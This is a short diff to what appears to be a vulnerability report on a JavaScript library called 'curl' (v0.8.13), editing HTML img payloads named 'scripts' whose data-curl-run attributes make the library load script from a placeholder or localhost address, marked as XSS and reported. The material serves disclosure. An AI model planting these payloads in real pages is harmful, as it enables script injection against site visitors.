@@ -5,7 +5,7 @@
 + Library: curl
 + Stars: 1.8K
 + Version: v0.8.13
-+ Payload: ```<img name="scripts" data-curl-run="http://xxx.xxx.xxx/"><img name="scripts" data-curl-run="http://xxx.xxx.xxx"> ```
++ Payload: ```<img name="scripts" data-curl-run="http://xxx.xxx.xxx/"><img name="scripts" data-curl-run="http://xxx.xxx.xxx">```
 + Impact: XSS
 + CVE: N/A
 + Status: Reported
@@ -117,7 +117,7 @@ loadScript: function (def, success, failure) {
 <!--Library-->
 
 <!--Payload-->
-<img name="scripts" src="http://localhost:9999">
-<img name="scripts" src="http://localhost:9999">
+<img name="scripts" src="http://localhost:9999" data-curl-run="http://localhost:9999">
+<img name="scripts" src="http://localhost:9999" data-curl-run="http://localhost:9999"> 
 <!--Payload-->
 ```
